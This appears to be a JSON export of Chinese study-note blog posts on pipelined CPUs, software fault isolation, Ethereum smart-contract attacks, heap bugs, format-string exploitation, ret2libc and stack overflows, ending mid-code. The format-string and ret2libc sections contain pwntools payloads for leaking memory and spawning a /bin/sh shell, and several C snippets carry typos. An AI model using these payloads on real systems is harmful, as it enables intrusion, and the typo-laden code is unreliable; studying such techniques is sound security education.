[{"content":"流水线CPU\r流水线核心概念\r理念\r将指令执行划分为多个时间均衡的子阶段，使得多条不同指令再不同阶段并行处理 处理方式\r可以想象一下，假设在洗衣时，需要经过洗涤（30min）$\\rightarrow$ 烘干 （40min）$\\rightarrow$ 折叠（20min），现在有4人需要洗衣服务，如果全部依次处理（单周期CPU），那么耗时是6h，即处理每个人的服务需要90min（1.5h），依次执行，共计耗时6h。如果使用流水线处理，可以在执行上一个人的烘干任务时执行下一个人的洗涤任务。 可以看到通过通过流水线处理将总耗时缩减到了3.5h 与洗衣类似，指令执行也可以分为三个阶段IF(Instucction Fetch), ID(Instruction Decode), Ex(Execution) 在串行处理中，与上面的洗衣类似，下一条指令在上一个指令的三个阶段全部结束后才开始 此时的运行时间为$6Δt$ (这里为了方便演示，假设各个阶段的处理时间相同) 可以发现与洗衣类似，后一条指令并不需要等待前一条执行完毕，而是只需要对应的模块”空出来“就可以执行 此时的运行时间为$5Δt$ 可以发现运行时间可以被进一步缩短，即增加重叠部分 此时的运行时间为$4Δt$ 以上两种重叠方式分别被称为 单重叠(Single overlapping) 和 双重叠(Twice overlapping) 重叠方式比较\r单重叠\r优点 相较串行运行时间缩短近$\\frac{1}{3}$（对大量指令） 功能单元利用率显著提升 缺点 需要额外硬件支持 控制过程复杂化 双重叠\r优点 相较串行运行时间缩短近$\\frac{2}{3}$（对大量指令） 功能单元利用率进一步显著提升 缺点 需要大量额外硬件支持 需要物理分离的fetch, decode和execution单元 注： 双重叠面临的问题和需要的硬件支持\r核心问题：内存访问冲突\r在双重叠中如果多条指令同时访问内存，会引发冲突 冲突场景： 实践场景：双重叠还原为单重叠\r上面的讲解都是基于三个阶段耗时相等的假设的，但是在实际CPU场景中，三个阶段的运行时间并不相等，一般IF阶段耗时最少，如果IF阶段耗时很短可以忽略，那么双重叠在优化上就约等与单重叠了 阶段不等长——重叠中的资源浪费和冲突问题\r在考虑到应用场景中各阶段不等长后，可以进一步考虑潜在的问题 如果ID \u0026lt; EX 可以看到此时一条指令的EX阶段在时间上与下一条指令的EX阶段发生了重叠，这被称之为资源冲突 如果ID \u0026gt; EX 可以看到此时的时间轴上存在未执行指令的部分，这被称为资源浪费 注：为什么是这种执行方式？ 所有流水线阶段在同一时钟边沿同步推进，即IF始终是在每个时钟周期开始时触发的。ID \u0026gt; EX的情况下的实际过程是IF(K+1)在执行完毕后等待到ID(K)执行完毕，开启下一个时钟周期才开始执行ID(K+1)和IF(K+2)。这个现象被称为阻塞(Block) 流水线概念\r核心解释\r指令分解：将单条指令的执行划分成m个子阶段，要求m\u0026gt;5。经典设计为五级流水线。m被称为流水线深度 时间均等：要求每个子阶段耗时严格相等($Δt_{stage}$)，由全局时钟周期$T_c$统一控制。若阶段耗时不等，以最慢阶段为基准设定($T_c$) 错位重叠：m条相邻指令在同一时间并行处理不同阶段 重叠方式参考上面的双重叠，实现全阶段并行 特征\r结构特征\r阶段划分：每阶段由专属功能单元实现（如IF/ID/EX） 时间均衡：最长阶段决定整体速度 这是流水线高效运行的关键，如果某个阶段时间比其他阶段长，这个阶段就会成为瓶颈(Bottleneck)，如上面所演示的那样导致阻塞 流水线寄存器：缓存阶段见数据，隔离各阶段操作 传递数据：在时钟边沿将前一个阶段在本时钟周期内处理完成的结果捕获并储存起来 数据保持：在下一个时钟周期这个数据会被提供给下一个阶段作为输入，确保数据在正确的时间被后续阶段使用 阶段隔离：当前一个阶段在下一个时钟周期开始处理新任务时，后一个阶段使用的是寄存器中保存的、前一个阶段上一个周期的结果。没有这些寄存器，前一阶段的新输出会立即冲掉后一阶段还在处理的输入，导致数据混乱和错误。 它确保了每个阶段在一个时钟周期内可以独立地处理分配给它的那份工作（数据）。 适用场景：大量重复的顺序工作\r大量：从上面的示例可以发现，在不考虑“开头”和“结尾”的情况下，当m=3时，运行时间应当是串行时间的$\\frac{1}{3}$.但实际可以看到，存在开头和结尾的额外开销，这被称为流水线启动和排空，在稍后会涉及。同时不难发现，当处理条数更多时，运行时间更接近$\\frac{1}{3}$，即-处理大量的指令时节省的时间可以稀释启动和排空开销 重复：任务的执行流程（分解成的阶段）是相似的。上面的演示中的阶段都是完全相同的，就是一种理想状态 顺序：任务见最好是顺序执行的，或相关性较低。如果任务间有较强的依赖性就容易导致阻塞 持续输入：保持流水线处于忙碌状态，避免空闲导致效率下降 时间参数：启动时间与排空时间\r启动时间/首次延迟：从第一个任务进入流水线到离开的总时间 排空时间/排空延迟：从最后一个任务进入到所有流水线任务结束的总时间 流水线分类\r按功能划分\r单功能流水线 多功能流水线 按照并行性划分（针对多功能流水线）\r静态流水线：多功能，但不支持混合任务。即同一时间段内智能固定配置为一种任务。切换任务需要排空当前流水线 动态流水线：支持混合任务 注：可以用咖啡机来做比喻。单功能流水线就是一台只能做美式咖啡的咖啡机。静态流水线可以做多种咖啡，但是每次切换口味需要清空管道。动态流水线可以同时制作多种咖啡。 按照运行顺序划分\r顺序流水线：任务的流出和流入顺序相同，上面的演示都是顺序流水线 乱序流水线：任务的流出和流入顺序可以不同，允许先完成后面的任务 按硬件划分\r部件级流水线/操作流水线：将处理器的算术逻辑运算部件（ALU）分段，使得各种类型的运算可以通过流水线方式执行。这是CPU内部针对单个复杂功能单元的流水化。例如，一个浮点乘法器可以被分成多个阶段（阶码处理、尾数处理、规格化等），从而让多个浮点乘法操作在内部重叠执行，提高该部件的吞吐率。 处理器级流水线/指令流水线：指令的解释和执行通过流水线实现。一条指令的执行过程被分成若干个子过程，每个子过程在一个独立的功能单元中执行。上面的演示都是指令流水线。RISC五级流水线就是一种指令流水线设计。 处理器间流水线/宏流水线：两个或更多处理器的连接，用于处理同一个数据流，每个处理器完成整个任务的一部分。常用于高性能计算或流处理系统 按照线性性划分\r线性流水线：各阶段串行连接，没有反馈回路。数据每个阶段中在每个段最多流过一次 非线性流水线：存在反馈回路，允许数据流回前面的阶段再次处理 基于RISC-V的流水线CPU\rRISC-V的流水线友好设计\r所有指令都是32位 精简和规整的指令格式 Load/Store架构 内存操作数强制对齐 流水线吞吐量\r公式定义 $$TP = \\frac{n}{T}$$ n: 处理的指令总数（任务数量） T: 完成任务的总时间 物理意义：单位时间内完成的指令数 性能上限约束 $$TP \u003c TP_{max}$$ 含义：实际吞吐量永远低于理论极限值 实际运行时间 $$ T = (m+n-1) \\times Δt_0 \\newline\rTP = \\frac{n}{T} = \\frac{n}{(m+n-1) \\times Δt_0}\\newline\rTP_{max} = \\frac{1}{Δt_0}\r$$ 可以发现当$n \u0026raquo; m$时，有$TP \\approx TP_{max}$ 可以写成 $$ TP = \\frac{n}{n+m-1}TP_{max}$$ 应用场景下的流水线吞吐量\r如之前的演示所反映的，流水线在实际可能会遇到瓶颈问题。容易想到，这一问题可以通过将时钟周期设置为最慢阶段耗时来解决，但这并不能提高效率。为了实际提高效率有其他解法 解决方案 细分(Subdivision)：将最长的阶段拆分为多个子阶段，每段耗时$Δt$ 资源复制(Repetition)：每$Δt$可开始一个新任务。这一解决方案实质上是在S2的内部执行并行加速。 更多性能衡量指标——Sp与η\rSp(speed up) $$Sp = \\frac{n \\times m \\times Δt_0}{(m+n-1)Δt_0} = \\frac{n \\times m}{m + n -1}$$ Sp衡量的是流水线相较串行加快运行速度的程度，当$n\u0026raquo;m$，即输入数据很多时，有$Sp \\approx m$，逼近上确界 η(Efficiency) $$η = \\frac{Sp}{m} = \\frac{n}{m+n-1}$$ η的含义是实际加速比比理论最大加速比，当$n\u0026raquo;m$，即输入数据很多时，有$Sη \\approx 1$，逼近上确界 ","date":"2025-07-15T09:34:00+08:00","permalink":"https://example.com/p/%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%8E%E5%9C%A8%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","title":"流水线与在处理器中的应用"},{"content":"Software-Based Fault Isolation\r隔离\r隔离方法\r基于硬件的虚拟化 操作系统进程 基于语言的隔离 SFI 性能对比 上下文切换开销 单指令开销 是否需要编译器支持 虚拟机 非常高 无 否 操作系统进程 高 无 否 基于语言的隔离 低 中或无（动态/静态检查） 是 SFI 低 低 可能（二进制重写工具） SFI\rSFI基本介绍\r核心机制 每个保护域（隔离模块）都被分配一个专属内存区域（沙盒） 隔离发生在同一进程的地址空间内 通过在关键指令前插入软件检查实现 SFI沙盒构造 分为三部分 数据区域(DR，Data region): [DB, DL] 保存堆、栈 代码区域(CR, Code region): [DB, DL] 保存代码 安全外部地址(SE, Safe externel) 托管需要更高权限的受信任服务 代码跳转到它们以访问资源 DR,CR和SE不相交 隔离的实现 代码段不可写 数据段不可执行 执法策略 检查每一个危险指令 危险指令: 读/写内存和控制转移指令 动态二进制翻译 在工作时拦截并重写危险指令，插入安全检查代码 内联引用监控 在编译时静态插入安全检查指令 具体执法方式 原始执法方式 在指令前插入检查 存在问题: 运行时开销高 仅完整性隔离 程序执行读远多于写，且在不考虑保密的情况下可以只检查写 数据区域专门化 数据区域地址具有相同的高位，被称作数据区域ID，检查地址是否配置了正确的数据区域ID即可 地址掩码 通过地址掩码将地址在执行前强制改写，使其指向数据段 单指令地址掩码: 缩减到一次指令实现改写地址 Data Guards\r引入伪指令\r数据保护包含地址检查和地址屏蔽 引入伪指令r' = dGuard(r) 该指令满足以下条件 如果r在DR中，r\u0026rsquo; = r 否则 对于地址检查，进入错误状态 对于地址掩码，r\u0026rsquo;获取到一个安全范围内的地址 Guard Zones\r","date":"2025-07-11T22:01:43+08:00","permalink":"https://example.com/p/sfi%E6%8A%80%E6%9C%AF/","title":"SFI技术"},{"content":"Smart Contract\r研究对象————Etheremu\rEtheremu基础知识\r账户\r外部账户(EOA) 外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。 一个外部账户有以下特性： 拥有一定的Ether 可以发送交易，由私钥控制 没有相关联的代码 合约账户 合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。 一个合约账户有以下特性 拥有一定的Ether 有关联代码，代码通过交易或其他合约发来的调用激活 当合约被执行时，只能操作合约账户的特定存储 在Etheremu中，这两种账户统称为“状态对象”，其中外部账户存储以太币余额状态，而合约账户除了余额还有智能合约及其变量的状态。通过交易的执行，这些状态对象发生变化，而 Merkle 树用于索引和验证状态对象的更新。一个以太坊的账户包含 4 个部分 nonce: 已执行交易总量 balance: 帐持币数量 storageRoot: 存储区哈希值 codeHash: 代码区哈希值 两个外部账户之间的交易只是一个价值转移；而外部账户和合约账户之间的交易会激活合约账户的代码，允许进行各种操作 交易\r交易指的是外部账户发送到另一账户的的消息的签名数据包 交易内容 from: 交易发送者地址 to: 交易接收者地址，如果为空代表创建或调用智能合约 value: 转移的以太币数量 data: 数据字段，如果存在，说明是一个创建或调用智能合约的交易 gaslimit: 交易允许消耗的最大gas数量 gasprice: 愿意发送给gas矿工的单价 nonce: 区分同一账户的不容交易的标记 hash: 以上信息生成的散列值 r,s,v: 签名信息 交易类型： 执行转账的交易 创建智能合约的交易 调用智能合约的交易 RPC\rJSON-RPC是一种无状态、轻量级的远程过程调用(RPC)协议。它定义了几种数据结构及处理规则。用于实现软件应用程序与Etheremu区块链的交互 转账\r操作过程： 生成一个交易，使用私钥签名 被签名的交易被广播到P2P网络 矿工将交易包含在一个块中 确认资金转账 燃料(Gas)\r需要设置Gas的原因: 处理停机问题（无限循环） Gas limit: 用户单次交易的gas上限 Gas price: Gas的当前单价，在交易前由用户设置，以Wei为单位 交易费用: Gas*Gas_price Gas消耗： 对于一般交易，消耗为21000 对于智能合约，取决于消耗的资源————执行的命令和使用的存储 EVM\r每个Etheremu节点都包含一个虚拟机，该虚拟机被称为EVM，发挥执行智能合约代码和更改并广播全局状态的作用 特性： 图灵完备性（存在Gas限制） 无浮点数 无系统时钟 核心设计目标: 确定性: 保证相同的输入必定有相同的输出 隔离性: 合约在沙盒环境中运行，不直接访问主机系统 可终止性: 通过Gas限制执行步骤 结构： 基于堆栈 注: 栈式架构特点 所有计算依赖操作数栈 没有通用寄存器 指令隐式操作栈 内存模型： 栈 结构 2字节，最深1024层 易失性 内存 结构 按字寻址的字节数组，可动态扩展 易失性 操作指令 mload(offset): 从内存偏移量处读32字节 mstore(offset,value): 将32字节value写入偏移量offset处 Gas成本: 初始免费，扩容时按每32字节支付Gas 存储 结构 每个合约有独立的持久化键值存储 映射规则: 2^256个键，每个键对应一个32字节的值 特性 持久化: 数据永久写入区块链状态 高Gas成本: 写入消耗成千乃至上万Gas 操作指令 sstore(key,value): 从栈上依次弹出value和key，将value存入存储中key对应的槽位 sload(key): 从栈顶弹出key，将存储中key对应的槽位的数据压入栈 代币合约\rERC-20代币合约\rERC-20是一种通用的智能合约规范，特点是每一个代币都和其他代币完全相等。它是资产通证化的最广泛使用标准 包含API方法和事件 totalSupply: 定义token总供应量 balancdOf: 返回钱包地址包含的token余额 transfer: 从总供应中转移一定数量token并发给用户 transferFrom: 在用户之间传输token approve: 验证是否允许在考虑总供应量的情况下分配一定的token allowance: 检查是否有余额向另一个账户发送token Uniswap\rUniswap是一个完成不同代币间的交易的自动化流动协议 注：自动化流动协议定义 自动化流动性协议是一种利用预定义的数学公式（如恒定乘积公式）和部署在区块链上的智能合约，自动管理用户贡献的资产池（流动性池），并为用户提供无需许可、去中心化、自动定价和执行的代币交换服务的系统。它完全消除了对传统订单簿和专业做市商的依赖，通过算法和社区提供的流动性实现市场功能。 每个（或对）Uniswap智能合约管理着一个由两个ERC-20代币储备组成的流动池 任何人都可以成为池的流动性提供者（LP），即存入基础代币来换取池代币 在池中维持价格：套利 货币对充当市商的角色，根据恒定乘积公式提供替换服务 恒定乘积公式可以简单地表示为$x * y = k$，说明交易不能改变一对储备余额的乘积 $k$通常被称为不变量。这个公式对规模较大的交易的执行速度比小的要慢得多 在实践中Uniswap对交易收取0.30%的费用，这笔费用被存入储备中 ERC-777代币合约\r被ERC-20类似，ERC-777也是一种可替换代币标准，交易时允许更复杂的交互 它的最重要功能是接收hook Etheremu安全漏洞和攻击方式\r重进入攻击\r核心漏洞：“先提款后记账” 具体实现：在提款函数(withdraw)中递归调用，在记录的存款变化前反复提取存款 防御方式： 检查-效果-交互模式: 按照执行检查、改变状态变量、执行与其他合同的交互的顺序运行 使用修饰符锁定（互斥锁）: 即设置一个标识符，当发生与其他合同交互时设置标识符，标识符重置1前无法再进行交互 调用与委托调用攻击\r基本概念：调用与委托调用\r调用: 调用另一个智能合约中的函数 委托调用: 执行来自另一个智能合约的函数，使用调用者的存储和上下文 UUPS(通用可升级代理标准)\r架构: 代理合约拆分\n示意图 代理合约(Proxy) 永久储存所有状态变量 持有逻辑合约地址 通过fallback函数将所有调用用delegatecall转发给逻辑合约 逻辑合约(Logic) 包含实际业务代码 无状态 可被替换（升级） UUPS漏洞: 未初始化\r如果UUPS合同未初始化，那么攻击者可以调用initialize()函数，实现“攻击者成为所有者” 攻击步骤 攻击者成为所有者 部署恶意合约 劫持升级过程 执行恶意代码 ","date":"2025-07-11T22:01:05+08:00","permalink":"https://example.com/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/","title":"智能合约"},{"content":"Heap vulnerabilities\r前置知识：malloc/free\r堆通过malloc/free来管理空间。可能存在如下安全漏洞： 释放后使用（UAF） 双重释放 差一错误 堆的使用规范\r当malloc的指针传递给free后禁止再对该指针进行读写操作 不要在堆分配中使用或泄漏未初始化的信息 不要读取或写入超过堆分配结束的字节 不要重复传递从malloc到free的指针 在分配开始前不要读取或写入字节 不要传递不是由malloc初始化的指针给free 在检查函数是否返回NULL前不要引用malloc指针 堆的内存分配\r内存分配方式\r堆内存是通过从内核调用sbrk系统来分配的 使用mmap来处理大内存分配，这是堆外分配，不在下面的讨论之内 堆相关微观结构\rmalloc_chunk\r我们称malloc申请的内存为chunk，在ptmalloc内部用malloc_chunk结构体表示，定义如下： 1 2 3 4 5 6 7 8 9 10 11 struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* 前一个相邻块的大小（仅当它空闲时有效）。否则被当前块的用户数据覆盖*/ INTERNAL_SIZE_T size; /*存储当前块的总大小（字节数）*/ struct malloc_chunk* fd; /* 前向指针 - 仅空闲时有效 */ struct malloc_chunk* bk; /* 后向指针 - 仅空闲时有效 */ struct malloc_chunk* fd_nextsize; /* 大块专用：指向下一个不同大小的块 */ struct malloc_chunk* bk_nextsize; /* 大块专用：指向上一个不同大小的块 */ } 字段解释： prev_size: 如果该chunk的物理相邻的前一个chunk是空闲的，在这里记录前一个chunk的大小；否则这里记录的是前一个chunk的数据。 size: 该chunk的大小，该大小必须是MALLOC_ ALIGNMENT的整数倍。如果不是，那么会被转换为满足大小的最小的MALLOC_ ALIGNMENT的整数倍，这通过request2size()宏完成。另外该字段的低三位对不记录大小，它们从高到低分别表示： NON_MAIN_ARENA: 记录当前chunk是否不属于主线程，1表示不属于，0表示属于 IS_MAPPED: 记录当前chunk是否是被mmap分配的 PREV_INUSE: 记录前一个chunk块是否被分配。一般来说，队中的第一个被分配的chunk块的size字段的P位都会设置为1，以防止访问前面的非法内存。当一个chunk的size地段的P位为0时，可以通过prev_size字段来获取上一个chunk的大小以及内存地址 fd,bk: chunk处于分配状态时，从fd字段开始是用户的数据。chunk空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd指向下一个（非物理相邻）空闲的chunk bk指向上一个（非物理相邻）空闲的\u0026rsquo;chunk` fd_nextsize， bk_nextsize: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 chunk结构 栈示意图： * 一个已经分配的 chunk 的样子如上。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。\r当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。\r* 被释放的`chunk`被记录在链表中（可能是循环双向链表，也可能是单向链表）。可以发现如果一个`chunk`处于free状态，会有两个位置记录其相应的大小。即本身的size字段和后面的`chunck`。一般情况下，物理相邻的两个空闲`chunck`会被合并为一个。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲`chunk`块\rbin\rbin的定义\r堆管理器需要跟踪释放的块，以便malloc可以在分配请求期间重用它们 堆管理器维护一系列被称为\u0026quot;bin\u0026quot;的列表来最大限度地提高分配和释放的速度 bin的分类\r共有5种容器：62个小容器，63个大容器，1个未排序容器，10个高速缓存容器，以及每个线程独有的64个线程缓存容器（如果启用） 小容器、大容器以及未排序容易被用于实现堆的基本回收策略，高速缓存容器和线程缓存容器则是实现优化 small bin\rlarge bin\runsorted bin\rfast bin\rtchache bin\r堆相关宏观结构\rArena\r每个arena就是一个独立的堆，独立地管理chunk和bin 对于每个新加入的线程，会试图找到一个没有其他线程正在使用的arena，并且将该arena附加到该线程上。 如果所有arena都被现有的线程使用，那么会创建一个新的arena，注意arena数量存在上限，对于32位架构为2*CPU内核数，对于64位架构为8*CPU内核数。 如果arena数量达到上限，将会出现线程共用aren以及随之而来的线程等待的可能。 堆上漏洞\rUAF(USE-AFTER-FREE)\r错误：在释放了堆上的内存后引用（又名悬垂指针引用） 后果：攻击者可以使用被释放的指针控制数据写入 错误示例： 1 2 3 4 5 6 7 8 9 10 11 12 int main(int argc, char** argv) { char *buf1, *buf2, *buf3; buf1 = (char*)malloc(BUFSIZE1); free(buf1); buf2 = (char*)malloc(BUFSIZE2); buf3 = (char*)malloc(BUFSIZE3); strncpy(buf1, argv[1], BUFSIZE-1); } 在该例子中，当buf1被释放后，该内存就立刻可以重用，之后在为buf2和buf3分配空间时可能分配了该内存。使用被释放的指针进行写操作就可能会覆盖buf2和buf3 利用UAF: 覆盖控制流数据 预防UAF: 将被释放的指针设置为NULL 双重释放(Double Free)\r示例： 1 2 3 4 5 6 7 8 9 int main(int argc, char** argv) { buf1 = (char*)malloc(BUFSIZE1); free(buf1); buf2 = (char*)malloc(BUFSIZE2); strbncpy(buf2, argv[1], BUFSIZE2-1); free(buf1); free(buf2); } 代码工作： 释放buf1，然后分配buf2 buf2可能占用buf1相同的内存空间 buf2获取用户提供的数据 再次释放buf1 其中可能使用一些buf2数据作为元数据 并且可能打乱buf2的元数据 然后是buf2，此时使用了混乱的元数据 双重释放可以达到与堆溢出漏洞类似的效果，可以使用类似的方式预防 空字节溢出(Off- by-Null)\r堆溢出一字节: 将缓冲区改为0 利用方式: 将P从1改写为0 这将导致前一个块被视为空闲 下一个块的释放会将空闲块合并 攻击流程： 分配内存，定位地址 空字节溢出 断链 写入覆盖 ","date":"2025-07-11T22:01:00+08:00","permalink":"https://example.com/p/%E5%A0%86%E6%BC%8F%E6%B4%9E/","title":"堆漏洞"},{"content":"Format string\r前置知识：可变参数函数\r处理可变参数函数的头文件：stdarg.h\r核心组件：\r类型定义va_list 作用：保存可变参数信息的上下文对象（本质是指向参数栈的指针） 用法： 1 va_list args; //声明参数变量列表 宏函数 va_start 作用：初始化va_list，使其指向第一个可变参数 访问参数前必须调用 va_arg 作用：获取当前参数的值（返回值），并且移动至下一个参数 va_end 作用：清理va_list资源 访问结束后必须调用 va_copy(C99新增) 作用：复制va_list的当前状态 用于嵌套访问 示例代码： 实现自定义的printf函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include\u0026lt;stdarg.h\u0026gt; void my_printf(const char* format, ...) { va_lists arg; va_start(arg, format); while(*format) { if(*format == \u0026#39;%\u0026#39;) { format++; switch(*format) { case\u0026#39;d\u0026#39;: { int num = va_arg(arg, int); print_int(num); break; } case\u0026#39;s\u0026#39;: { char* str = vaarg(arg, char*); print_str(str); break; } } } else { putchar(*format); } format++; } va_end(arg); } 实现多加数加法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #incclude\u0026lt;stdarg.h\u0026gt; int add_multiple_values(int argcount, ...) { int counter, res = 0; va_list arg; va_start(arg, argcount); for(counter=0; counter\u0026lt;argcount, counter++) { res += va_arg(arg. int); } va_end(arg); return res; } 格式化字符串漏洞\r核心原理\r格式化输出的栈上分布 示例 代码 1 printf(\u0026#34;Color %s, Number %d, Float %4.2f\u0026#34;, \u0026#34;red\u0026#34;, 123456, 3.14); 栈示意图 泄露内存\r核心思想: printf是依次打印栈上的数据，即可以通过printf(\u0026quot;%x\u0026quot;)直接打印栈上内容 泄露栈内存\r以以下程序为例：\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\u0026#34;%s\u0026#34;, s); printf(\u0026#34;%08x.%08x.%08x.%s\\n\u0026#34;, a, b, c, s); printf(s); return 0; } 编译运行后有\n1 2 3 %08x.%08x.%08x 00000001.22222222.ffffffff.%08x.%08x.%08x ffcfc400.000000c2.f765a6bb 打印出了栈上后续三个字的值\n泄露任意地址内存\r核心思想：利用%s访问的是栈上地址，将想要访问的地址写入栈上特定位置，然后使用%s访问输出 详细操作步骤 Step1:确定偏移量（参数位置） 1 2 payload = b\u0026#34;AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p\u0026#34; io.sendline(payload) 输出示例 1 AAAA.0xffffd09c.0x100.0x80491fe.0xffffd144.0xf7fbe780.0xf7d93374.0x41414141 观察到AAAA的十六进制值0x41414141出现在第7个位置。这个偏移量用于后面指定printf访问的参数位置 Step2:构造地址载荷 1 2 target_addr = 0x804c02c # 要泄露的地址 payload = p32(target_addr) # 打包为小端序 Step3:指定读取位置 1 payload += b\u0026#34;%7$s\u0026#34; #使用步骤1确定的偏移量 Step4:选择读取方式 Step5:发送并解析数据 1 2 3 4 5 6 7 8 9 10 # 发送完整payload payload = p32(target_addr) + b\u0026#34;%7$s\u0026#34; io.sendline(payload) # 接收输出 output = io.recvuntil(b\u0026#34;done\u0026#34;) # 根据程序输出调整 # 解析泄露数据 leak_start = output.find(p32(target_addr)) + 4 # 跳过地址本身 leaked_data = output[leak_start:-10] # 去除尾部\u0026#34;id is...done\u0026#34; Step6:清理输出 1 2 3 4 5 6 7 8 9 10 11 12 # 接收并清理输出 io.recvuntil(b\u0026#34;Address of id is 0x\u0026#34;) # 跳过提示 addr_str = io.recvline().strip() # 获取地址（可选） io.recvuntil(b\u0026#34;you typed: \u0026#34;) # 跳过输入回显 # 接收实际泄露数据 leaked = io.recvuntil(b\u0026#34;\\n\u0026#34;, drop=True) # 处理二进制地址 if leaked.startswith(p32(target_addr)): leaked = leaked[4:] # 移除开头的地址副本 覆盖内存\r核心思想：利用%n 1 %n，将成功输出的字符个数写入对应的整型指针参数所指的变量。 通用操作：构造特定长度的填充，将目标内容，即填充部分长度，写入目标地址。具体操作与泄露类似。 ","date":"2025-07-11T22:00:00+08:00","permalink":"https://example.com/p/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"格式化字符串"},{"content":"Return to libc\rret2libc的意义： 绕过 DEP（Data Execution Prevention）\rCanary\rCannary是一种栈溢出保护机制。是在栈上返回地址前插入一个随机值，该随机值被称为canary。在函数返回前检查canary是否被篡改，如果被篡改，则立刻终止程序 原理：栈溢出时会覆盖返回值下方（低位）的内容，即canary 带canary的栈布局示意图 DEP\r可以发现在Stack overflow中介绍的攻击方式是通过拿shell实现的，因此只要禁止在数据段中执行程序就可以阻止该攻击方式。 DEP就是通过这种方式实现的保护机制 相关知识： 冯诺伊曼架构与哈佛架构 在冯诺伊曼架构中所有代码都是数据，所以可以通过注入数据插入可执行代码 哈佛架构将虚拟地址空间划分为数据区和代码区，代码区是可读（R）和可执行（X）的，数据区域是可读（R）和可写（W）的。任何区域都不能是同时可读，可执行和可写的。 攻破DEP的方式：代码复用攻击\rDEP阻止了我们直接注入代码，但是代码一定要通过外界注入吗？ 可以发现程序和库同样是有函数的，因此我们可以利用其中的函数构建出我们需要的攻击。 理念：重用程序和库中的代码（不需要代码注入） return to libc: 将返回地址替换为危险函数的地址 例： 1 execve(\u0026#34;/bin/sh\u0026#34;); 思路： 找到系统函数的地址 找到字符串\u0026quot;/bin/sh\u0026quot; 将\u0026quot;/bin/sh\u0026quot;传递给系统函数 操作： Step1: 可以使用gdb来查找系统功能地址 Step2: 使用系统环境变量（不稳定） 定义环境变量 示例: 1 2 3 4 5 6 7 8 9 10 11 12 set MYSHELL=“/bin/sh” int main(int argc, char **argv) { printf(\u0026#34;ret2libc start \\n\u0026#34;); char *shell = (char *) getenv(\u0026#34;MYSHELL\u0026#34;); if (shell) { printf(\u0026#34;address %p \\n\u0026#34;, shell); } vul(); printf(\u0026#34;ret2libc end \\n\u0026#34;); return 0; } Step3: 注入： 注入后堆栈展示： 构造注入展示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * # 获取地址（需提前泄露） system_addr = 0xb7e3dda0 # system()地址 bin_sh_addr = 0xb7f6e5aa # \u0026#34;/bin/sh\u0026#34;地址 exit_addr = 0xb7e369d0 # exit()地址 (可选) # 构造payload offset = 140 # 到返回地址的偏移量 payload = b\u0026#39;A\u0026#39; * offset # 填充缓冲区 payload += p32(system_addr) # 覆盖返回地址 payload += p32(exit_addr) # system()的返回地址 payload += p32(bin_sh_addr) # 参数1: \u0026#34;/bin/sh\u0026#34; # 发送payload io = process(\u0026#39;./vuln_program\u0026#39;) io.sendline(payload) io.interactive() 对上述ret2libc的防护：ASLR\rASLR：\r可以发现，上面的攻击方式中的核心步骤之一是获取系统函数的地址，因此容易想到，如果我们能够阻止获取系统函数地址，就可以实现对上述攻击方式的防护。 ASLR：随机化关键内存基地址 Linux中ASLR分为三级 0：无随机化 1：保留的随机化，共享库、栈、mmp()和VSDO随机化 2：完全的随机化，通过brk()分配的内存空间也会随机化 ","date":"2025-07-11T21:59:45+08:00","permalink":"https://example.com/p/%E8%BF%94%E5%9B%9E%E5%BA%93%E6%96%87%E4%BB%B6/","title":"返回库文件"},{"content":"栈溢出（stack overflow）\r一些术语/概念\r类型安全（Type safety） In computer science, type safety and type soundness are the extent to which a programming language discourages or prevents type errors. ————From wikipidiea 前置知识：x86架构下函数调用中的栈变化\r初始：\n栈示意图： 压入参数（arg1， arg2）\n指令： 1 2 push arg2 push arg1 ;注意，逆序压入参数 栈示意图： 调用函数\n指令 1 2 3 4 call fuc ; 等价于 push eip+5 ;5为call指令的长度 jmp fuc 栈示意图 函数序言（Prologue）\n指令： 1 2 3 push ebp ;保存调用者的EBP mov ebp, esp ;设置当前函数的EBP sub esp, 8 ;为局部变量分配空间（示例中分配8字节） 栈示意图 访问数据\n指令： 1 2 3 mov eax, [ebp+8] ;访问arg1 mov ebx, [ebp+12] ;访问arg2 mov ecx, [ebp-4] ;访问val1 栈示意图 函数尾声\n指令 1 2 3 mov esp, ebp ;释放局部变量 pop ebp ;恢复调用者ebp ret ;返回到调用者 栈示意图(Epilogue) 调用者清理参数\n指令 1 sub esp, 8 栈示意图： 栈溢出\r缓冲区溢出\r当数据写入到分配给特定数据结构的内存边界范围之外时，就会发生缓冲区溢出\n当缓冲区边界被忽略和未检查时会发生\n示例： 1 2 3 4 5 6 7 8 #include\u0026lt;stdio.h\u0026gt; int main() { char a[5]; gets(a); puts(a); printf(\u0026#34;%c\u0026#34;, 